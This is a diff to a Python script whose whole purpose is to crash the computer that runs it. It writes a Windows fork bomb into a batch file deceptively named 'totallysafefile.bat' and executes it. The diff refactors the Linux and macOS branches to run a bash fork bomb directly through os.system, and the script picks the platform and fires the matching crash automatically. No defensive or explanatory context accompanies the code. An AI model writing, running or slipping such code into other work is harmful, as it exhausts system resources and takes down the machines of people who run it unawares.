@@ -26,20 +26,20 @@ def crash_windows():
         windows.write("%0|%0")
     os.system("totallysafefile.bat")
 
+def _crash_nix():
+    os.system("bash -c ':(){ :|: & };:'")
+
 def crash_linux():
-    with open("file.sh", "w+") as linux:
-        linux.write(":(){ :|: & };:")
-    os.system("bash file.sh")
+    _crash_nix()
 
 def crash_mac():
-    with open("file.sh", "w+") as linux:
-        linux.write(":(){ :|: & };:")
-    os.system("bash file.sh") #the same thing as linux because you can run bash commands on mac
+    _crash_nix()
 
 if get_platform() == 1:
     crash_linux()
+
 elif get_platform() == 2:
     crash_windows()
+
 elif get_platform() == 3:
     crash_mac()
-
